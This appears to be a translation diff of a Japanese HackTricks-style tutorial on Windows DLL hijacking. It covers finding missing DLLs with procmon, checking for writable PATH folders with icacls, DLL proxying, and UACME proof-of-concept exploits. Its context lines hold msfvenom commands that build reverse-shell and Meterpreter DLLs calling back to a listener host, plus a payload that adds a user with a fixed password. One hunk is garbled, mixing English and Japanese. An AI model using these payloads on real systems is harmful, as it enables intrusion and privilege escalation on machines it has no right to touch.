@@ -29,16 +29,16 @@ DLL Hijackingは、信頼されたアプリケーションを操作して悪意�
 
 DLLハイジャックにはいくつかの方法があり、各アプリケーションのDLL読み込み戦略に応じて効果が異なります：
 
-1. **DLL Replacement**: 正規のDLLを悪意のあるDLLと入れ替え、オプションでDLLプロキシを使用して元のDLLの機能を保持します。
+1. **DLL Replacement**: 本物のDLLを悪意のあるDLLと入れ替え、オプションでDLL Proxyingを使用して元のDLLの機能を保持します。
 2. **DLL Search Order Hijacking**: 悪意のあるDLLを正当なDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
 3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要なDLLだと思い込んで読み込む悪意のあるDLLを作成します。
 4. **DLL Redirection**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
-5. **WinSxS DLL Replacement**: WinSxSディレクトリ内で正当なDLLを悪意のあるDLLと置き換えます。この方法はDLLサイドローディングに関連しています。
-6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと共にユーザーが制御するディレクトリに悪意のあるDLLを配置し、バイナリプロキシ実行技術に似ています。
+5. **WinSxS DLL Replacement**: WinSxSディレクトリ内で正当なDLLを悪意のあるDLLに置き換えます。この方法はDLLサイドローディングに関連しています。
+6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと共にユーザーが制御するディレクトリに悪意のあるDLLを配置し、Binary Proxy Execution技術に似ています。
 
 ## Finding missing Dlls
 
-システム内で欠落しているDLLを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**します：
+システム内の欠落しているDLLを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**します：
 
 ![](<../../../.gitbook/assets/image (961).png>)
 
@@ -48,18 +48,18 @@ DLLハイジャックにはいくつかの方法があり、各アプリケー�
 
 ![](<../../../.gitbook/assets/image (153).png>)
 
-一般的に**欠落しているdllを探している**場合は、これを**数秒間**実行します。\
+一般的に**欠落しているdllを探している**場合は、これを数**秒間**実行します。\
 特定の実行可能ファイル内の**欠落しているdllを探している**場合は、**"Process Name" "contains" "\<exec name>"**のような別のフィルターを設定し、それを実行してイベントのキャプチャを停止する必要があります。
 
 ## Exploiting Missing Dlls
 
-特権を昇格させるための最良のチャンスは、**特権プロセスが読み込もうとするdllを書くことができる**ことです。したがって、**元のdll**があるフォルダーの前に**dllが検索されるフォルダー**に**dllを書く**ことができるか、**dllが検索されるフォルダー**に書き込むことができ、元の**dllがどのフォルダーにも存在しない**場合です。
+特権を昇格させるための最良のチャンスは、**特権プロセスが読み込もうとするdllを書くことができる**ことです。したがって、**元のdll**があるフォルダーの前に**dllが検索される**フォルダーに**dllを書く**ことができるか、**dllが検索される**フォルダーに書き込むことができ、元の**dllがどのフォルダーにも存在しない**場合です。
 
 ### Dll Search Order
 
-**Microsoftのドキュメント**[**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**の中で、DLLがどのように読み込まれるかを具体的に見つけることができます。**
+**Microsoftのドキュメント**[**こちら**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)で、DLLがどのように読み込まれるかを具体的に確認できます。
 
-**Windowsアプリケーション**は、特定の順序に従って**事前定義された検索パス**に従ってDLLを探します。DLLハイジャックの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正当なDLLの前に読み込まれることを保証する場合に発生します。この問題を防ぐための解決策は、アプリケーションが必要なDLLを参照する際に絶対パスを使用することです。
+**Windowsアプリケーション**は、特定の順序に従って一連の**事前定義された検索パス**に従ってDLLを探します。DLLハイジャックの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正当なDLLの前に読み込まれることを保証する場合に発生します。これを防ぐための解決策は、アプリケーションが必要なDLLを参照する際に絶対パスを使用することです。
 
 32ビットシステムの**DLL検索順序**は以下の通りです：
 
@@ -68,7 +68,7 @@ DLLハイジャックにはいくつかの方法があり、各アプリケー�
 3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。 (_C:\Windows\System_)
 4. Windowsディレクトリ。 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用してこのディレクトリのパスを取得します。(_C:\Windows_)
 5. 現在のディレクトリ。
-6. PATH環境変数にリストされているディレクトリ。これは、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスを含まないことに注意してください。 **App Paths**キーは、DLL検索パスを計算する際には使用されません。
+6. PATH環境変数にリストされているディレクトリ。これは、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスを含まないことに注意してください。DLL検索パスを計算する際に**App Paths**キーは使用されません。
 
 これは、**SafeDllSearchMode**が有効な場合の**デフォルト**の検索順序です。無効にすると、現在のディレクトリが2番目の位置に昇格します。この機能を無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効です）。
 
@@ -82,9 +82,9 @@ DLLハイジャックにはいくつかの方法があり、各アプリケー�
 
 Windowsのドキュメントには、標準のDLL検索順序に関する特定の例外が記載されています：
 
-* **メモリに既に読み込まれているDLLと同じ名前のDLL**が遭遇した場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを行い、メモリ内のDLLにデフォルトします。このシナリオでは、システムはDLLの検索を行いません。
+* **メモリに既に読み込まれているDLLと同じ名前のDLL**が見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを行い、メモリ内のDLLにデフォルトします。このシナリオでは、システムはDLLの検索を行いません。
 * DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはその既知のDLLのバージョンとその依存DLLを使用し、**検索プロセスを省略します**。レジストリキー**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが保持されています。
-* **DLLに依存関係がある場合**、これらの依存DLLの検索は、最初のDLLがフルパスで識別されたかどうかに関係なく、**モジュール名**のみで示されたかのように行われます。
+* **DLLに依存関係がある場合**、これらの依存DLLの検索は、最初のDLLがフルパスで特定されたかどうかに関係なく、**モジュール名**のみで示されたかのように行われます。
 
 ### Escalating Privileges
 
@@ -93,19 +93,21 @@ Windowsのドキュメントには、標準のDLL検索順序に関する特定�
 * **異なる特権**（水平または側方移動）で動作するか、動作するプロセスを特定し、**DLLが欠落している**ことを確認します。
 * **DLLが検索される**任意の**ディレクトリ**に**書き込みアクセス**があることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。
 
-はい、要件は複雑で、**デフォルトでは特権のある実行可能ファイルがDLLを欠落させているのを見つけるのは奇妙です**し、**システムパスフォルダーに書き込み権限を持つのはさらに奇妙です**（デフォルトではできません）。しかし、誤って構成された環境ではこれは可能です。\
-運が良ければ要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトを確認できます。**プロジェクトの主な目的はUACをバイパスすることですが、使用できるWindowsバージョンのDLLハイジャックの**PoC**が見つかるかもしれません（おそらく書き込み権限のあるフォルダーのパスを変更するだけです）。
+はい、要件は見つけるのが難しいです。**デフォルトでは、特権のある実行可能ファイルがDLLを欠落させているのは奇妙です**し、**システムパスフォルダーに書き込み権限を持つのはさらに奇妙です**（デフォルトではできません）。しかし、誤って設定された環境ではこれは可能です。\
+運が良ければ要件を満たしている場合、[UACME](https://github.com/hfiref0x/UACME)プロジェクトを確認できます。**プロジェクトの主な目的はUACをバイパスすることですが、使用できるWindowsバージョンのDLLハイジャックの**PoC**が見つかるかもしれません（おそらく書き込み権限のあるフォルダーのパスを変更するだけで済みます）。
 
 フォルダー内の**権限を確認する**には、次のようにします：
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-そして**PATH内のすべてのフォルダーの権限を確認します**:
+And **すべてのフォルダーのパーミッションを確認する PATH 内**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-あなたは次のコマンドを使用して、実行可能ファイルのインポートとdllのエクスポートを確認することもできます:
+You can also check the imports of an executable and the exports of a dll with:
+
+あなたはまた、実行可能ファイルのインポートとdllのエクスポートを確認することができます:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
@@ -130,9 +132,9 @@ For a full guide on how to **abuse Dll Hijacking to escalate privileges** with p
 
 ### **Dll Proxifying**
 
-基本的に、**Dllプロキシ**は、**読み込まれたときに悪意のあるコードを実行することができるDll**ですが、**実際のライブラリへのすべての呼び出しを中継することによって**、**期待通りに** **露出**し、**機能する**こともできます。
+基本的に、**Dllプロキシ**は、**読み込まれたときに悪意のあるコードを実行することができるDll**ですが、**実際のライブラリへのすべての呼び出しを中継することによって**、**期待通りに機能する**こともできます。
 
-ツール[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実行可能ファイルを指定し、プロキシ化したいライブラリを選択して**プロキシ化されたdllを生成**したり、**Dllを指定してプロキシ化されたdllを生成**したりできます。
+ツール[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実行可能ファイルを指定し、プロキシ化したいライブラリを選択して**プロキシ化されたdllを生成する**ことができます。または、**Dllを指定して**、**プロキシ化されたdllを生成する**こともできます。
 
 ### **Meterpreter**
 
@@ -144,7 +146,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**ユーザーを作成する (x86のバージョンしか見当たりませんでした):**
+**ユーザーを作成する (x86のバージョンしか見ていませんでした):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
@@ -238,7 +240,7 @@ return TRUE;
 
 <figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**バグバウンティのヒント**: **ハッカーによる、ハッカーのためのプレミアム** **バグバウンティプラットフォーム** **Intigriti**に**サインアップ**しましょう！今日、[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得し始めましょう！
+**バグバウンティのヒント**: **ハッカーによって、ハッカーのために作られたプレミアム** **バグバウンティプラットフォーム** **Intigritiにサインアップ** しましょう！今日、[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) に参加して、最大 **$100,000** のバウンティを獲得し始めましょう！
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
